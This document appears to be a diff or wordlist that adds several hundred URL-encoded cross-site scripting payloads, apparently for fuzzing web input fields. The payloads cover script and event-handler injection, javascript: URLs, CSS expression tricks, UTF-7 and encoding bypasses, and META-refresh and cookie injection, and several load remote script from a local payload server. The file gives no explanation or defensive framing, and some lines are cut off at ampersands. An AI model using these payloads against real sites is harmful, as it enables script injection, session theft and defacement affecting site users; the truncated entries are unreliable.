+%3Cbody%20onload=%22alert(1)%22%3E  
+%22%3E%3Cbody%20onload=%22alert(1)%22%3E  
+'%3E%3Cbody%20onload=%22alert(1)%22%3E  
+%3Cimg%20src=%22javascript:alert(1)%22%3E  
+%22%3E%3Cimg%20src=%22javascript:alert(1)%22%3E  
+'%3E%3Cimg%20src=%22javascript:alert(1)%22%3E  
+%3Cp%20style=%22background:url('javascript:alert(1)')%22%3E  
+%22%3E%3Cp%20style=%22background:url('javascript:alert(1)')%22%3E  
+'%3E%3Cp%20style=%22background:url('javascript:alert(1)')%22%3E  
+'%20style=abc:expression(X)%20'%20/%22%20style=abc:expression(X)%20/%22  
+%22%20type=image%20src=null%20onerror=X%20%22%20/'%20type=image%20src=null%20onerror=X%20/'  
+onload='X'%20/%22%20onload=/%22X/%22/onload=/%22X/%22/onload='X'/  
+/'/%22%3C//script%3E%3C//xml%3E%3C//title%3E%3C//textarea%3E%3C//noscript%3E%3C//style%3E%3C//listing%3E%3C//xmp%3E%3C//pre%3E%3Cimg%20src=null%20onerror=X%3E  
+%3C%3Cscr/0ipt/src=http://127.0.0.1:3555/xss_serve_payloads/X.js%3E%3C/script  
+%22%3E%3C%3Cscr/0ipt/src=http://127.0.0.1:3555/xss_serve_payloads/X.js%3E%3C/script  
+'%3E%3C%3Cscr/0ipt/src=http://127.0.0.1:3555/xss_serve_payloads/X.js%3E%3C/script  
+%3C%3Cscr/0ipt/src=http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%3E%3C/script  
+%22%3E%3C%3Cscr/0ipt/src=http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%3E%3C/script  
+'%3E%3C%3Cscr/0ipt/src=http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%3E%3C/script  
+%3Cimg%20src=%22x:gif%22%20onerror=%22window['al/u0065rt'](1)%22%3E%3C/img%3E  
+%22%3E%3Cimg%20src=%22x:gif%22%20onerror=%22window['al/u0065rt'](1)%22%3E%3C/img%3E  
+'%3E%3Cimg%20src=%22x:gif%22%20onerror=%22window['al/u0065rt'](1)%22%3E%3C/img%3E  
+%3Cimg%20src=%22x:gif%22%20onerror=%22eval('al'%2b'lert(1)')%22%3E  
+%22%3E%3Cimg%20src=%22x:gif%22%20onerror=%22eval('al'%2b'lert(1)')%22%3E  
+'%3E%3Cimg%20src=%22x:gif%22%20onerror=%22eval('al'%2b'lert(1)')%22%3E  
+%3Cimg%20src=%22x:alert%22%20onerror=%22eval(src%2b'(1)')%22%3E  
+%22%3E%3Cimg%20src=%22x:alert%22%20onerror=%22eval(src%2b'(1)')%22%3E  
+'%3E%3Cimg%20src=%22x:alert%22%20onerror=%22eval(src%2b'(1)')%22%3E  
+%3Cimg/src=%22mars.png%22alt=%22mars%22%3E  
+%22%3E%3Cimg/src=%22mars.png%22alt=%22mars%22%3E  
+'%3E%3Cimg/src=%22mars.png%22alt=%22mars%22%3E  
+%3Cobject%20data=%22javascript:alert(1)%22%3E  
+%22%3E%3Cobject%20data=%22javascript:alert(1)%22%3E  
+'%3E%3Cobject%20data=%22javascript:alert(1)%22%3E  
+%3Cisindex%20type=image%20src=1%20onerror=alert(1)%3E  
+'%3E%3Cisindex%20action=javascript:alert(1)%20type=image%3E  
+%3Cimg%20src=x:alert(alt)%20onerror=eval(src)%20alt=0%3E  
+%22%3E%3Cimg%20src=x:alert(alt)%20onerror=eval(src)%20alt=0%3E  
+'%3E%3Cimg%20src=x:alert(alt)%20onerror=eval(src)%20alt=0%3E  
+%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%3Ealert(1);%3C/x:script%3E  
+%22%3E%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%3Ealert(1);%3C/x:script%3E  
+'%3E%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%3Ealert(1);%3C/x:script%3E  
+%3Cimg%20src=foo.png%20onerror=alert%28%2FKCF%2F%29/%3E  
+%22%3E%3Cimg%20src=foo.png%20onerror=alert%28%2FKCF%2F%29/%3E  
+'%3E%3Cimg%20src=foo.png%20onerror=alert%28%2FKCF%2F%29/%3E  
+%22;location='javascript:alert(1)';  
+%22;location=location.hash)//  
+%22;eval(unescape(location))//  
+%3Cb/alt=%221%22onmouseover=InputBox+1language=vbs%3EX%3C/b%3E  
+%22%3E%3Cb/alt=%221%22onmouseover=InputBox+1language=vbs%3EX%3C/b%3E  
+'%3E%3Cb/alt=%221%22onmouseover=InputBox+1language=vbs%3EX%3C/b%3E  
+%3Cb%20%22%3Cscript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E%22%3EX%3C/b%3E  
+%3C/a%20onmousemove=%22alert(1)%22%3E  
+%22%3E%3C/a%20onmousemove=%22alert(1)%22%3E  
+'%3E%3C/a%20onmousemove=%22alert(1)%22%3E  
+data:text/html,%3Cscript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%3Cimg%20src=%22x:%C3%B6%22%20title=%22onerror=alert(1)//%22%3E  
+%22%3E%3Cimg%20src=%22x:%C3%B6%22%20title=%22onerror=alert(1)//%22%3E  
+'%3E%3Cimg%20src=%22x:%C3%B6%22%20title=%22onerror=alert(1)//%22%3E  
+%3Cimg%20src=%22x:?%20title=%22%20onerror=alert(1)//%22%3E  
+%22%3E%3Cimg%20src=%22x:?%20title=%22%20onerror=alert(1)//%22%3E  
+'%3E%3Cimg%20src=%22x:?%20title=%22%20onerror=alert(1)//%22%3E  
+%C2%BCscript%C2%BEalert(%C2%A2X%C2%A2)%C2%BC/script%C2%BE  
+%3CMETA%20HTTP-EQUIV=%22refresh%22%20CONTENT=%220;url=javascript:alert(1);%22%3E  
+%22%3E%3CMETA%20HTTP-EQUIV=%22refresh%22%20CONTENT=%220;url=javascript:alert(1);%22%3E  
+'%3E%3CMETA%20HTTP-EQUIV=%22refresh%22%20CONTENT=%220;url=javascript:alert(1);%22%3E  
+%3CMETA%20HTTP-EQUIV=%22refresh%22%20CONTENT=%220;url=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%22%3E  
+%22%3E%3CMETA%20HTTP-EQUIV=%22refresh%22%20CONTENT=%220;url=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%22%3E  
+'%3E%3CMETA%20HTTP-EQUIV=%22refresh%22%20CONTENT=%220;url=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%22%3E  
+%3CMETA%20HTTP-EQUIV=%22refresh%22%20CONTENT=%220;%20URL=http://;URL=javascript:alert(1);%22%3E  
+%22%3E%3CMETA%20HTTP-EQUIV=%22refresh%22%20CONTENT=%220;%20URL=http://;URL=javascript:alert(1);%22%3E  
+'%3E%3CMETA%20HTTP-EQUIV=%22refresh%22%20CONTENT=%220;%20URL=http://;URL=javascript:alert(1);%22%3E  
+%3CDIV%20STYLE=%22background-image:%20url(javascript:alert(1))%22%3E  
+%22%3E%3CDIV%20STYLE=%22background-image:%20url(javascript:alert(1))%22%3E  
+'%3E%3CDIV%20STYLE=%22background-image:%20url(javascript:alert(1))%22%3E  
+%3Cdiv%20style=%22background-image:%20url(javascript:alert(1););%22%3E  
+%22%3E%3Cdiv%20style=%22background-image:%20url(javascript:alert(1););%22%3E  
+'%3E%3Cdiv%20style=%22background-image:%20url(javascript:alert(1););%22%3E  
+%3CDIV%20STYLE=%22background-image:%20url(&  
+%22%3E%3CDIV%20STYLE=%22background-image:%20url(&  
+'%3E%3CDIV%20STYLE=%22background-image:%20url(&  
+%3Cdiv%20style=%22behaviour:%20url(http://127.0.0.1:3555/xss_serve_payloads/X.html);%22%3E  
+%22%3E%3Cdiv%20style=%22behaviour:%20url(http://127.0.0.1:3555/xss_serve_payloads/X.html);%22%3E  
+'%3E%3Cdiv%20style=%22behaviour:%20url(http://127.0.0.1:3555/xss_serve_payloads/X.html);%22%3E  
+%3Cdiv%20style=%22binding:%20url(http://127.0.0.1:3555/xss_serve_payloads/X.html));%22%3E  
+%22%3E%3Cdiv%20style=%22binding:%20url(http://127.0.0.1:3555/xss_serve_payloads/X.html));%22%3E  
+'%3E%3Cdiv%20style=%22binding:%20url(http://127.0.0.1:3555/xss_serve_payloads/X.html));%22%3E  
+%3Cdiv%20style=%22behaviour:%20url('http://127.0.0.1:3555/xss_serve_payloads/X.html');%22%3E  
+%22%3E%3Cdiv%20style=%22behaviour:%20url('http://127.0.0.1:3555/xss_serve_payloads/X.html');%22%3E  
+'%3E%3Cdiv%20style=%22behaviour:%20url('http://127.0.0.1:3555/xss_serve_payloads/X.html');%22%3E  
+%3Cdiv%20style=%22binding:%20url(%22http://127.0.0.1:3555/xss_serve_payloads/X.html%22));%22%3E  
+%22%3E%3Cdiv%20style=%22binding:%20url(%22http://127.0.0.1:3555/xss_serve_payloads/X.html%22));%22%3E  
+'%3E%3Cdiv%20style=%22binding:%20url(%22http://127.0.0.1:3555/xss_serve_payloads/X.html%22));%22%3E  
+%3CSCRIPT%20%3CB%3Ealert(1);%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%20%3CB%3Ealert(1);%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%20%3CB%3Ealert(1);%3C/SCRIPT%3E  
+%3C%3CSCRIPT%3Ealert(1);/  
+%22%3E%3C%3CSCRIPT%3Ealert(1);/  
+'%3E%3C%3CSCRIPT%3Ealert(1);//%3C%3C/SCRIPT%3E  
+%22%3E%3C%3CSCRIPT%3Ealert(1);//%3C%3C/SCRIPT%3E  
+'%3E%3C%3CSCRIPT%3Ealert(1);//%3C%3C/SCRIPT%3E  
+%3C%3Cscript%3Ealert(1);%3C/script%3E  
+%22%3E%3C%3Cscript%3Ealert(1);%3C/script%3E  
+'%3E%3C%3Cscript%3Ealert(1);%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1);%3C/script%3E  
+'%3E%3Cscript%3Ealert(1);%3C/script%3E  
+%3CINPUT%20TYPE=%22IMAGE%22%20SRC=%22javascript:alert(1);%22%3E  
+%22%3E%3CINPUT%20TYPE=%22IMAGE%22%20SRC=%22javascript:alert(1);%22%3E  
+'%3E%3CINPUT%20TYPE=%22IMAGE%22%20SRC=%22javascript:alert(1);%22%3E  
+%3CIMG%20SRC=%22javascript:alert(1)%22  
+%22%3E%3CIMG%20SRC=%22javascript:alert(1)%22  
+'%3E%3CIMG%20SRC=%22javascript:alert(1)%22  
+%3Ciframe%20src=http://127.0.0.1:3555/xss_serve_payloads/X.html%20%3C  
+%22%3E%3Ciframe%20src=http://127.0.0.1:3555/xss_serve_payloads/X.html%20%3C  
+'%3E%3Ciframe%20src=http://127.0.0.1:3555/xss_serve_payloads/X.html%20%3C  
+%3CSCRIPT%3Ea=/X/  
+%22%3E%3CSCRIPT%3Ea=/X/  
+'%3E%3CSCRIPT%3Ea=/X/alert(a.source)%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%3Ea=/X/alert(a.source)%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%3Ea=/X/alert(a.source)%3C/SCRIPT%3E  
+/%22;alert(1);//  
+%3Cinput%20onfocus=javascript:alert(1)%20autofocus%3E  
+%22%3E%3Cinput%20onfocus=javascript:alert(1)%20autofocus%3E  
+'%3E%3Ctextarea%20onfocus=javascript:alert(1)%20autofocus%3E  
+%3Ckeygen%20onfocus=javascript:alert(1)%20autofocus%3E  
+%22%3E%3Ckeygen%20onfocus=javascript:alert(1)%20autofocus%3E  
+'%3E%3Ckeygen%20onfocus=javascript:alert(1)%20autofocus%3E  
+%3Cinput%20autofocus%20onfocus=alert(1)%3E  
+%22%3E%3Cinput%20autofocus%20onfocus=alert(1)%3E  
+'%3E%3Cinput%20autofocus%20onfocus=alert(1)%3E  
+%3Ciframe/%20/onload=alert(1)%3E%3C/iframe%3E  
+%22%3E%3Ciframe/%20/onload=alert(1)%3E%3C/iframe%3E  
+'%3E%3Ciframe/%20/onload=alert(1)%3E%3C/iframe%3E  
+%3Ciframe/%20%22onload=alert(1)%3E%3C/iframe%3E  
+%22%3E%3Ciframe/%20%22onload=alert(1)%3E%3C/iframe%3E  
+'%3E%3Ciframe/%20%22onload=alert(1)%3E%3C/iframe%3E  
+%3Ciframe///////onload=alert(1)%3E%3C/iframe%3E  
+%22%3E%3Ciframe///////onload=alert(1)%3E%3C/iframe%3E  
+'%3E%3Ciframe///////onload=alert(1)%3E%3C/iframe%3E  
+%3Ciframe%20%22onload=alert(1)%3E%3C/iframe%3E  
+%22%3E%3Ciframe%20%22onload=alert(1)%3E%3C/iframe%3E  
+'%3E%3Ciframe%20%22onload=alert(1)%3E%3C/iframe%3E  
+%3Ciframe%3C?php%20echo%20chr(11)?%3E%20onload=alert(1)%3E%3C/iframe%3E  
+%22%3E%3Ciframe%3C?php%20echo%20chr(11)?%3E%20onload=alert(1)%3E%3C/iframe%3E  
+'%3E%3Ciframe%3C?php%20echo%20chr(11)?%3E%20onload=alert(1)%3E%3C/iframe%3E  
+%3Ciframe%3C?php%20echo%20chr(12)?%3E%20onload=alert(1)%3E%3C/iframe%3E  
+%22%3E%3Ciframe%3C?php%20echo%20chr(12)?%3E%20onload=alert(1)%3E%3C/iframe%3E  
+'%3E%3Ciframe%3C?php%20echo%20chr(12)?%3E%20onload=alert(1)%3E%3C/iframe%3E  
+%3CScRIPT%20x%20src=//0x.lv?%3C/style%3E%3C/script%3E%3Cscript%3Ealert(String.fromCharCode(75,67,70))%3C/script%3E  
+%22%3E%3C/script%3E%3Cscript%3Ealert(String.fromCharCode(75,67,70))%3C/script%3E  
+'%3E%3C/script%3E%3Cscript%3Ealert(String.fromCharCode(75,67,70))%3C/script%3E  
+%22%3E%3Cscript%3Ealert(String.fromCharCode(75,67,70))%3C/script%3E  
+'%3E%3Cscript%3Ealert(String.fromCharCode(75,67,70))%3C/script%3E%3Cscript%20src=http://127.0.0.1:3555/xss_serve_payloads/X.js%3E  
+%3CScRIPT%20x%20src=//0x.lv?%3C/style%3E%3C/script%3E%3Cscript%3Ealert(String.fromCharCode(75,67,70))%3C/script%3E  
+%22%3E%3C/script%3E%3Cscript%3Ealert(String.fromCharCode(75,67,70))%3C/script%3E  
+'%3E%3C/script%3E%3Cscript%3Ealert(String.fromCharCode(75,67,70))%3C/script%3E  
+%22%3E%3Cscript%3Ealert(String.fromCharCode(75,67,70))%3C/script%3E  
+'%3E%3Cscript%3Ealert(String.fromCharCode(75,67,70))%3C/script%3E%3Cscript%20src=http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%3E  
+%3C/script%3E%3Cscript%3Ealert(X  
+%22%3E%3C/script%3E%3Cscript%3Ealert(X  
+'%3E%3C/script%3E%3Cscript%3Ealert(X  
+%7D%3C/style%3E43%27%22%3E%3C/title%3E%3Cscript%3Ea=eval;b=alert;a(b(/X/.source));%3C/script%3E%27%22%3E%3Cmarquee%3E%3Ch1%3EX%3C/h1%3E%3C/marquee%3E  
+&  
+%3CFRAMESET%3E%3CFRAME%20SRC=%22javascript:alert(1);%22%3E%3C/FRAMESET%3E  
+%22%3E%3CFRAMESET%3E%3CFRAME%20SRC=%22javascript:alert(1);%22%3E%3C/FRAMESET%3E  
+'%3E%3CFRAMESET%3E%3CFRAME%20SRC=%22javascript:alert(1);%22%3E%3C/FRAMESET%3E  
+')alert(1);  
+%22);alert(1);  
+%E2%80%9C;alert(%E2%80%9CX%E2%80%9D);%E2%80%9D  
+%E2%80%9C;alert(String.fromCharCode(75,67,70));%E2%80%9D  
+%E2%80%98;alert(%E2%80%9CX%E2%80%9D);%E2%80%99  
+%E2%80%98;alert(String.fromCharCode(75,67,70));%E2%80%99  
+%E2%80%9C;alert(%E2%80%9CX%E2%80%9D)  
+%E2%80%9C;alert(String.fromCharCode(75,67,70))  
+%E2%80%98;alert(%E2%80%9CX%E2%80%9D)  
+%E2%80%98;alert(String.fromCharCode(75,67,70))  
+%3Cscript%3Evar%20var%20=%201;%20alert(var)%3C/script%3E  
+%22%3E%3Cscript%3Evar%20var%20=%201;%20alert(var)%3C/script%3E  
+'%3E%3Cscript%3Evar%20var%20=%201;%20alert(var)%3C/script%3E  
+%3Cscript%20type=text/javascript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%20type=text/javascript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%20type=text/javascript%3Ealert(1)%3C/script%3E  
+%E2%80%9C%3E%3Cscript%20%3Ealert(1)%3C/script%3E  
+%3Ciframe%20src=%22http://127.0.0.1:3555/xss_serve_payloads/X.html%22%20width=%22800%22%20height=%22800%22%3Eiframe%3C/iframe%3E  
+%22%3E%3Ciframe%20src=%22http://127.0.0.1:3555/xss_serve_payloads/X.html%22%20width=%22800%22%20height=%22800%22%3Eiframe%3C/iframe%3E  
+'%3E%3Ciframe%20src=%22http://127.0.0.1:3555/xss_serve_payloads/X.html%22%20width=%22800%22%20height=%22800%22%3Eiframe%3C/iframe%3E  
+%3CIMG%20SRC=%60javascript:alert(%E2%80%9CX%20says,%20%E2%80%98X%E2%80%99%E2%80%9D)%60%3E  
+%22%3E%3CIMG%20SRC=%60javascript:alert(%E2%80%9CX%20says,%20%E2%80%98X%E2%80%99%E2%80%9D)%60%3E  
+'%3E%3CIMG%20SRC=%60javascript:alert(%E2%80%9CX%20says,%20%E2%80%98X%E2%80%99%E2%80%9D)%60%3E  
+%3Cimg%20src%20=%20%E2%80%9Dhttp://127.0.0.1:3555/xss_serve_payloads/X.js%E2%80%9D%3E  
+%22%3E%3Cimg%20src%20=%20%E2%80%9Dhttp://127.0.0.1:3555/xss_serve_payloads/X.js%E2%80%9D%3E  
+'%3E%3Cimg%20src%20=%20%E2%80%9Dhttp://127.0.0.1:3555/xss_serve_payloads/X.js%E2%80%9D%3E  
+%3Cimg%20src%20=%20%E2%80%9Dhttp://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%E2%80%9D%3E  
+%22%3E%3Cimg%20src%20=%20%E2%80%9Dhttp://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%E2%80%9D%3E  
+'%3E%3Cimg%20src%20=%20%E2%80%9Dhttp://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%E2%80%9D%3E  
+%3CA%20HREF=%22//127.0.0.1:3555/xss_serve_payloads/X.html%22%3EX%3C/A%3E  
+%22%3E%3CA%20HREF=%22//127.0.0.1:3555/xss_serve_payloads/X.html%22%3EX%3C/A%3E  
+'%3E%3CA%20HREF=%22//127.0.0.1:3555/xss_serve_payloads/X.html%22%3EX%3C/A%3E  
+%3CA%20HREF=%22http://127.0.0.1:3555/xss_serve_payloads/X.html./%22%3EX%3C/A%3E  
+%22%3E%3CA%20HREF=%22http://127.0.0.1:3555/xss_serve_payloads/X.html./%22%3EX%3C/A%3E  
+'%3E%3CA%20HREF=%22http://127.0.0.1:3555/xss_serve_payloads/X.html./%22%3EX%3C/A%3E  
+%3CA%20HREF=%22javascript:document.location='http://127.0.0.1:3555/xss_serve_payloads/X.html'%22%3EX%3C/A%3E  
+%22%3E%3CA%20HREF=%22javascript:document.location='http://127.0.0.1:3555/xss_serve_payloads/X.html'%22%3EX%3C/A%3E  
+'%3E%3CA%20HREF=%22javascript:document.location='http://127.0.0.1:3555/xss_serve_payloads/X.html'%22%3EX%3C/A%3E  
+%3CIMG%20SRC=&  
+%22%3E%3CIMG%20SRC=&  
+'%3E%3CIMG%20SRC=&  
+%3CIMG%20SRC=&  
+%22%3E%3CIMG%20SRC=&  
+'%3E%3CIMG%20SRC=&  
+%3CIMG%20SRC=&  
+%22%3E%3CIMG%20SRC=&  
+'%3E%3CIMG%20SRC=&  
+%3CDIV%20STYLE=%22background-image:/0075/0072/006C/0028'/006a/0061/0076/0061/0073/0063/0072/0069/0070/0074/003a/0061/006c/0065/0072/0074/0028.1027/0058.1053/0053/0027/0029'/0029%22%3E  
+%22%3E%3CDIV%20STYLE=%22background-image:/0075/0072/006C/0028'/006a/0061/0076/0061/0073/0063/0072/0069/0070/0074/003a/0061/006c/0065/0072/0074/0028.1027/0058.1053/0053/0027/0029'/0029%22%3E  
+'%3E%3CDIV%20STYLE=%22background-image:/0075/0072/006C/0028'/006a/0061/0076/0061/0073/0063/0072/0069/0070/0074/003a/0061/006c/0065/0072/0074/0028.1027/0058.1053/0053/0027/0029'/0029%22%3E  
+%E2%80%9C%3E%3Cs%E2%80%9D%2b%E2%80%9Dcript%3Ealert(1)%3C/script%3E  
+%E2%80%9C%3E%3CScRiPt%3Ealert(1)%3C/script%3E  
+%E2%80%9C%3E%3C%3Cscript%3Ealert(1);//%3C%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%3Cscr%3Cscript%3Eipt%3Ealert(1)%3C/scr%3C/script%3Eipt%3E  
+%22%3E%3Cscr%3Cscript%3Eipt%3Ealert(1)%3C/scr%3C/script%3Eipt%3E  
+'%3E%3Cscr%3Cscript%3Eipt%3Ealert(1)%3C/scr%3C/script%3Eipt%3E  
+';alert(String.fromCharCode(75,67,70))///';alert(String.fromCharCode(75,67,70))//%22;alert(String.fromCharCode(75,67,70))///%22;alert(String.fromCharCode(75,67,70))//--&gt;&lt;/SCRIPT&gt;%22&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(75,67,70))&lt;/SCRIPT&gt;  
+';alert(String.fromCharCode(75,67,70))///';alert(String.fromCharCode(75,67,70))//%22;alert(String.fromCharCode(75,67,70))///%22;alert(String.fromCharCode(75,67,70))//--%3E%3C/SCRIPT%3E%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharCode(75,67,70))%3C/SCRIPT%3E=&%7B%7D  
+'';!--%22&lt;X&gt;=&amp;%7B()%7D  
+&lt;IMG%20SRC=%22javascript:alert(1);%22&gt;  
+&lt;IMG%20SRC=javascript:alert(1)&gt;  
+&lt;IMG%20SRC=JaVaScRiPt:alert(1)&gt;  
+&lt;IMG%20SRC=javascript:alert(&amp;quot;X&amp;quot;)&gt;  
+&lt;IMG%20SRC=%60javascript:alert(%22Kerala%20Cyber%20Force%20says,%20'X'%22)%60&gt;  
+&lt;IMG%20%22%22%22&gt;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;%22&gt;  
+&lt;IMG%20SRC=javascript:alert(String.fromCharCode(75,67,70))&gt;  
+&lt;IMG%20SRC=&amp;  
+&lt;IMG%20SRC=%22jav&  
+&lt;IMG%20SRC=%22jav&amp;  
+%3CIMG%20SRC=%60javascript:alert(1)%60%3E  
+%22%3E%3CIMG%20SRC=%60javascript:alert(1)%60%3E  
+'%3E%3CIMG%20SRC=%60javascript:alert(1)%60%3E  
+&lt;IMG&  
+%3CIMG%20STYLE=%22X:expr/*X*/ession(alert(1))%22%3E  
+%22%3E%3CIMG%20STYLE=%22X:expr/*X*/ession(alert(1))%22%3E  
+'%3E%3CIMG%20STYLE=%22X:expr/*X*/ession(alert(1))%22%3E  
+%3CIMG%20DYNSRC=%22javascript:alert(1)%22%3E  
+%22%3E%3CIMG%20DYNSRC=%22javascript:alert(1)%22%3E  
+'%3E%3CIMG%20DYNSRC=%22javascript:alert(1)%22%3E  
+%3Cimg%20dynsrc=%22javascript:alert(1);%22%3E  
+%22%3E%3Cimg%20dynsrc=%22javascript:alert(1);%22%3E  
+'%3E%3Cimg%20dynsrc=%22javascript:alert(1);%22%3E  
+%3CIMG%20LOWSRC=%22javascript:alert(1)%22%3E  
+%22%3E%3CIMG%20LOWSRC=%22javascript:alert(1)%22%3E  
+'%3E%3CIMG%20LOWSRC=%22javascript:alert(1)%22%3E  
+%3Cinput%20type=%22image%22%20dynsrc=%22javascript:alert(1);%22%3E  
+%22%3E%3Cinput%20type=%22image%22%20dynsrc=%22javascript:alert(1);%22%3E  
+'%3E%3Cinput%20type=%22image%22%20dynsrc=%22javascript:alert(1);%22%3E  
+%3CSTYLE%3Eli%20%7Blist-style-image:%20url(%22javascript:alert(1)%22);%7D%3C/STYLE%3E%3CUL%3E%3CLI%3EX  
+%22%3E%3CSTYLE%3Eli%20%7Blist-style-image:%20url(%22javascript:alert(1)%22);%7D%3C/STYLE%3E%3CUL%3E%3CLI%3EX  
+'%3E%3CSTYLE%3Eli%20%7Blist-style-image:%20url(%22javascript:alert(1)%22);%7D%3C/STYLE%3E%3CUL%3E%3CLI%3EX  
+%3CDIV%20STYLE=%22width:%20expression(alert(1));%22%3E  
+%22%3E%3CDIV%20STYLE=%22width:%20expression(alert(1));%22%3E  
+'%3E%3CDIV%20STYLE=%22width:%20expression(alert(1));%22%3E  
+%3Cdiv%20style=%22width:%20expression(alert(1););%22%3E  
+%22%3E%3Cdiv%20style=%22width:%20expression(alert(1););%22%3E  
+'%3E%3Cdiv%20style=%22width:%20expression(alert(1););%22%3E  
+%3CSTYLE%3E@im/port'/ja/vasc/ript:alert(1)';%3C/STYLE%3E  
+%22%3E%3CSTYLE%3E@im/port'/ja/vasc/ript:alert(1)';%3C/STYLE%3E  
+'%3E%3CSTYLE%3E@im/port'/ja/vasc/ript:alert(1)';%3C/STYLE%3E  
+%3CX%20STYLE=%22X:expression(alert(1))%22%3E  
+%22%3E%3CX%20STYLE=%22X:expression(alert(1))%22%3E  
+'%3E%3CX%20STYLE=%22X:expression(alert(1))%22%3E  
+exp/*%3CA%20STYLE='no/X:noX(%22*//*%22);X:&  
+%3CSTYLE%20TYPE=%22text/javascript%22%3Ealert(1);%3C/STYLE%3E  
+%22%3E%3CSTYLE%20TYPE=%22text/javascript%22%3Ealert(1);%3C/STYLE%3E  
+'%3E%3CSTYLE%20TYPE=%22text/javascript%22%3Ealert(1);%3C/STYLE%3E  
+%3CSTYLE%3E.X%7Bbackground-image:url(%22javascript:alert(1)%22);%7D%3C/STYLE%3E  
+%22%3E%3CSTYLE%3E.X%7Bbackground-image:url(%22javascript:alert(1)%22);%7D%3C/STYLE%3E  
+'%3E%3CSTYLE%3E.X%7Bbackground-image:url(%22javascript:alert(1)%22);%7D%3C/STYLE%3E  
+%3CA%20CLASS=X%3E%3C/A%3E  
+%22%3E%3CA%20CLASS=X%3E%3C/A%3E  
+'%3E%3CA%20CLASS=X%3E%3C/A%3E  
+%3CSTYLE%20type=%22text/css%22%3EBODY%7Bbackground:url(%22javascript:alert(1)%22)%7D%3C/STYLE%3E  
+%22%3E%3CSTYLE%20type=%22text/css%22%3EBODY%7Bbackground:url(%22javascript:alert(1)%22)%7D%3C/STYLE%3E  
+'%3E%3CSTYLE%20type=%22text/css%22%3EBODY%7Bbackground:url(%22javascript:alert(1)%22)%7D%3C/STYLE%3E  
+%3C?xml:namespace%20prefix=%22t%22%20ns=%22urn:schemas-microsoft-com:time%22%3E  
+%22%3E%3C?xml:namespace%20prefix=%22t%22%20ns=%22urn:schemas-microsoft-com:time%22%3E  
+'%3E%3C?xml:namespace%20prefix=%22t%22%20ns=%22urn:schemas-microsoft-com:time%22%3E  
+%3C?%20echo('%3CSCR)';echo('IPT%3Ealert(1)%3C/SCRIPT%3E');%20?%3E  
+%22%3E%3C?%20echo('%3CSCR)';echo('IPT%3Ealert(1)%3C/SCRIPT%3E');%20?%3E  
+'%3E%3C?%20echo('%3CSCR)';echo('IPT%3Ealert(1)%3C/SCRIPT%3E');%20?%3E  
+%3CMETA%20HTTP-EQUIV=%22Set-Cookie%22%20Content=%22USERID=&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;%22%3E  
+%22%3E%3CMETA%20HTTP-EQUIV=%22Set-Cookie%22%20Content=%22USERID=&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;%22%3E  
+'%3E%3CMETA%20HTTP-EQUIV=%22Set-Cookie%22%20Content=%22USERID=&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;%22%3E  
+%3CHEAD%3E%3CMETA%20HTTP-EQUIV=%22CONTENT-TYPE%22%20CONTENT=%22text/html;%20charset=UTF-7%22%3E%20%3C/HEAD%3E+ADw-SCRIPT+AD4-alert(1);+ADw-/SCRIPT+AD4-  
+%22%3E%3CHEAD%3E%3CMETA%20HTTP-EQUIV=%22CONTENT-TYPE%22%20CONTENT=%22text/html;%20charset=UTF-7%22%3E%20%3C/HEAD%3E+ADw-SCRIPT+AD4-alert(1);+ADw-/SCRIPT+AD4-  
+'%3E%3CHEAD%3E%3CMETA%20HTTP-EQUIV=%22CONTENT-TYPE%22%20CONTENT=%22text/html;%20charset=UTF-7%22%3E%20%3C/HEAD%3E+ADw-SCRIPT+AD4-alert(1);+ADw-/SCRIPT+AD4-  
+%3CXML%20ID=0%3E%3CI%3E%3CB%3E&lt;IMG%20SRC=%22javas%3C!--%20--%3Ecript:alert(1)%22&gt;%3C/B%3E%3C/I%3E%3C/XML%3E  
+%22%3E%3CXML%20ID=0%3E%3CI%3E%3CB%3E&lt;IMG%20SRC=%22javas%3C!--%20--%3Ecript:alert(1)%22&gt;%3C/B%3E%3C/I%3E%3C/XML%3E  
+'%3E%3CXML%20ID=0%3E%3CI%3E%3CB%3E&lt;IMG%20SRC=%22javas%3C!--%20--%3Ecript:alert(1)%22&gt;%3C/B%3E%3C/I%3E%3C/XML%3E  
+%3CSPAN%20DATASRC=%22  
+%22%3E%3CSPAN%20DATASRC=%22  
+'%3E%3CSPAN%20DATASRC=%22  
+a=%22get%22;b=%22URL(/%22%22;c=%22javascript:%22;d=%22alert(1);/%22)%22;eval(a+b+c+d);  
+%3C?import%20namespace=%22t%22%20implementation=%22  
+%22%3E%3C?import%20namespace=%22t%22%20implementation=%22  
